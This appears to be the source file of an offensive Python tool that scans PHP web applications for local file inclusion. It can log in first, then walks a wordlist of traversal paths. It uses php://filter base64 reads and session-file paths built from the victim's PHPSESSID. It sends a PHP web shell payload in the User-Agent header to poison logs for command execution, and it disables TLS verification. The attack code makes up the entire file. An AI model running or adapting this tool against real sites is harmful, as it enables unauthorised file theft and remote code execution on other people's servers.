#!/usr/bin/env python
import urllib.response
import time
import sys
import argparse
import mechanize
import ssl
import urllib
import re
import os
import subprocess

ssl._create_default_https_context = ssl._create_unverified_context  
from Package.one_read import Read_File
path = ('file://'+os.getcwd()+'/FileStore/').replace('\\n','')    
class Aggressiv : 

        def __init__(self,**kwargs):          
            try: 
                with open(self .args.readuser,'r') as username:
                        self.args.user = username.read().replace('\n','') 
                        print(self.args.user) 
            except TypeError:
                    pass         
            if self.args.readpass or self.args.config:
                try:
                    with open(self.args.readpass,'r') as password:
                       self.args.password = password.read().replace('\n','')
                except TypeError:
                    pass      
            try:   
                if self.args.Cookie  or self.args.config:
                   with open(self.args.Cookie,'r') as Cookie_file :
                      self.Cookie =  Cookie_file.read() 
            except Exception as e :
                   print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                   print("[*] Error : ",e )
                   print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                   print("[*] Chech the File Name or File Path  to your Cookies File")
                   exit()    

            print('\n'+'='*20+"\n[*] Input-INFO "+'\n'+'='*30+'\n')
            if self.args.auth:
               print("[+] Mothead             : ................ | : Full authentication")    
               print("[+] Login url           : ................ | : "+self.args.loginurl)
               if self.args.user:
                  print("[+] username            : ................ | : "+self.args.user.replace("\n",''))
                  print("[+] Login password      : ................ | : "+self.args.password)
            print("[+] LFI-wordlist        : ................ | : aggressiv.txt")
            print("[+] Vulnrenable url     : ................ | : "+self.args.Vulnurl)
            if self.args.base64:
               print("[+] PHP-Filter          : ................ | : Convert-base64") 
            print("[+] web Cookies         : ................ | : "+self.Cookie) 
        def Login_auth(self,**kwargs):
            if self.args.auth:
                try:
                      loginurl = self.args.loginurl
                      request = mechanize.Browser()
                      request.set_handle_robots(False)
                      request.set_handle_redirect(True)
                      request.set_handle_refresh(True, max_time=1)
                      request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                           ('username',f'{self.args.user}'.replace('\n','')),
                                           ('password',f'{self.args.password}'),
                                           ('Cookie',str(self.Cookie).replace('\n',''))]                     
                      url_login = request.open(loginurl,timeout=5)    
                      try: 
                          request.select_form(nr = 0)
                      except Exception :
                          try:
                            request.select_form(nr = 1)
                          except Exception:
                             try:
                               request.select_form(nr = 2)
                             except Exception:      
                                try:
                                   request.select_form(nr = 3)
                                except Exception:
                                     try:
                                        request.select_form(nr = 4)
                                     except Exception as e:
                                          print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                                          print("[*] Error : ",e )
                                          print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                                          print("[*] try to use with out login Mothead") 
                                          print('[+] To use LFI without  login : --Vulnurl --filelist --Cookie') 
                                          exit()                                   

                      if  self.args.user and self.args.password and not self.args.PassForm and  not self.args.UserForm  :
                           request["username"] = f'{self.args.user}'.replace('\n','')
                           request["password"] = f'{self.args.password}'.replace('\n','') 
                      elif self.args.user and  self.args.password and not self.args.PassForm and  self.args.UserForm:
                           request[f'{self.args.UserForm}'] = f'{self.args.user}'.replace('\n','')
                           request["password"] = f'{self.args.password}'.replace('\n','')
                      elif self.args.user and self.args.password and self.args.PassForm and not self.args.UserForm :
                           request["username"] = f'{self.args.user}'.replace('\n','')
                           request[f'{self.args.PassForm}']=f'{self.args.password}'.replace('\n','') 
                      elif self.args.user and self.args.password and  self.args.PassForm and  self.args.UserForm :
                           request[f'{self.args.UserForm}'] = f'{self.args.user}'.replace('\n','')
                           request[f'{self.args.PassForm}']=f'{self.args.password}'.replace('\n','')
                      response   = request.submit()         
                      self.info = response.info()
                      content    = response.read()  
                      self.url = response.geturl()
                except urllib.error.URLError as e:
                    print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                    print("[*] Error : ",e )
                    print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                    print("[*] Follow url Format ")
                    print("[*] url Format : http/https://<ip>:<port>/<dir>")  
                    print("[*] Example : http://10.10.10.193:4000/page=index.php")
                    exit()          
        def url_request(self,**kwargs): 
          try:
            self.box_list    = []  
            self.link_list = []
            try: 
              domain = str(re.search('https?://(www\.)?([a-zA-Z0-9]+)(\.[a-zA-Z0-9.-]+)', self.args.Vulnurl)).split()
              self.ip_re = (domain[-1][7:-2])
              self.ip_re = self.ip_re[6:]
            except Exception :
               self.ip_re = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})',self.args.Vulnurl)
               self.ip_re = self.ip_re.group()    
            if not os.path.exists('./FileStore/'+self.ip_re+"/"):
                  os.makedirs('./FileStore/'+self.ip_re+"/")                
            ssl._create_default_https_context = ssl._create_unverified_context 
            num  = 0   
             
            with open('./Package/LFIA.txt','r') as readline :
                command_dir = readline.readlines()
                for LINE in command_dir :
                    LINE.replace('\n','')
                    self.LFi = ''
                    if self.args.base64:
                        if 'sess_' not in LINE :
                            phpfillter = 'php://filter/read=convert.base64-encode/resource='
                            URL = self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE
                        else:
                            URL = self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE.replace('\n','')+str("".join(re.findall(r"PHPSESSID=([a-z0-9]+)",self.Cookie)))
                    elif "sess_" in LINE: 
                        URL = self.args.Vulnurl+LINE.replace('\n','')+str("".join(re.findall(r"PHPSESSID=([a-z0-9]+)",self.Cookie))) 
                    else:
                         URL = self.args.Vulnurl+LINE
                                                                                      
                    self.url =  URL
                    request = mechanize.Browser()
                    request.set_handle_robots(False)
                    request.set_handle_redirect(True)
                    request.set_handle_refresh(True, max_time=0)              
                    request.addheaders = [('User-agent', 'Mozilla/5.0<?php echo system($_GET["cmd"]); ?>(X11; U; Linux i686; en-US; rv:1.9.0.1)\
                                 Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                 ('Cookie',str(self.Cookie).replace('\n','')),
                                 ('username',f'{self.args.user}'),
                                 ('password',f'{self.args.password}')]
                    try:   
                        first_req = request.open(self.args.Vulnurl).read()   
                        self.Get_Oregnal_URL = request.open(self.url,timeout=3).read()
                    except Exception  as e :
                         print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                         print("[*] Error : ",e )
                         print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                         print("[*] Try To Use PHP-Filter as -B Option ")
                         print("[*] Follow url Format ")
                         print("[*] url Format : http/https://<ip>:<port>/<dir>")  
                         print("[*] Example : http://10.10.10.193:4000/page=index.php")
                         exit()     
                    except KeyboardInterrupt :
                         exit()        
                    self.number = str(len(self.Get_Oregnal_URL))
                    try:  
                        filename = LINE.replace('../','').replace('%2f','').replace('....//','').replace('../','').replace('file://','').replace('//','/').replace('\n','')
                        if self.args.base64:
                            fullurl = self.url.replace('\n','').replace('php://filter/read=convert.base64-encode/resource=','')
                        else:    
                            fullurl = self.url.replace('\n','')
                    except IndexError:
                            pass  
                    if self.args.auth  or not self.args.auth  :   
                       if not self.args.auth:
                          pass
                       else:                                                         
                           pythex = str(re.findall('Content-Length:.+',str(self.info)))
                           pythex= pythex.replace("['",'').replace("']",'')
                           if pythex in str(self.info):
                              info = str(self.info).replace(pythex,'Content-Length:'+str(len(self.Get_Oregnal_URL)))
                              rex2 = re.findall(':.+',info) 
                       for _ in range(1):
                             if num ==1 :
                               pass
                             else: 
                                 if num == 0 : 
                                    if self.args.auth : 
                                       print('='*20+"\n[*] Web-Info "+'\n'+'='*30+'\n')
                                       print("[+] Date                : ................ | "+rex2[0])
                                       print("[+] Server              : ................ | "+rex2[1])
                                       print("[+] Expires             : ................ | "+rex2[2])
                                       print("[+] Cache-Control       : ................ | "+rex2[3])
                                       print("[+] Pragma              : ................ | "+rex2[4])
                                       print("[+] Vary                : ................ | "+rex2[5])
                                       print("[+] Content-Length      : ................ | "+str(rex2[6]).replace(':',': '))
                                       print("[+] Connection          : ................ | "+rex2[7])
                                       print("[+] Content-Type        : ................ | "+rex2[8]+'\n')
                                    print('='*20+"\n[*] Agressive Mode   "+'\n'+'='*30+'\n')
                                    if self.args.base64:
                                       print('[+] PHP-Filter : ...............| : php://filter/read=convert.base64-encode/resource='+'\n')
                                    print(" "+"-"*149) 
                                    print("|  "+f"{'   File-Name    ':<23}","|"+f"{'    Length    ':<10}"+"|",f"{'  Full-URL   ':<100}","     |")
                                    print(" "+"-"*149)                    
                                    num = 1 
                             try:       
                                print("|  "+f"{  filename[0:20]     :<23}","| "+f"{    self.number   :<13}"+"| ",f"{   fullurl[0:100]   :<100}","    |",end='\n')   

                             except IndexError:
                                 continue                    
                       self.box_list.append(self.number)
                       self.link_list.append(self.url.replace('\n',' '))
                       self.link_list.append (str(len(self.Get_Oregnal_URL)))
          except KeyboardInterrupt :
             pass                                            
        def Scan_result(self,**kwargs) :
            final_list = []
            unique_elements = set(self.box_list)
            link_dict = dict(zip(self.link_list[::2], self.link_list[1::2]))
            with open('./Package/.list', 'w') as listf:
                for key, value in link_dict.items():
                    listf.write(f"{key}{value}\n")
            with open('./Package/.list', 'r') as readf:
                read_lines = readf.readlines()
                for line in read_lines:
                    for element in unique_elements:
                        if element in line[-6:-1] and element not in final_list:
                            final_list.append(line.strip())
                            final_list.append(element)
            final_list.sort()
            with open('./Package/.links', 'w') as writefile:
                for entry in final_list:
                    links = "".join(re.findall(r'(https?://[^\s]+)', entry))
                    if links:
                        writefile.write(f'[+] {links[0:]}\n')
            with open('./Package/.links', 'r') as readfile:
                readdata = "\n".join(readfile.read().splitlines())
            print('\n' + '=' * 40 + " \n[*] Vulnerable Path " + '\n' + '=' * 30 + '\n')
            print(readdata)    
            if os.path.exists('./Package/.links'):
                os.remove('./Package/.links')
            if os.path.exists('./Package/.list'):
                os.remove('./Package/.list')
           

if __name__=='__main__':
     Aggressiv()                  
                 
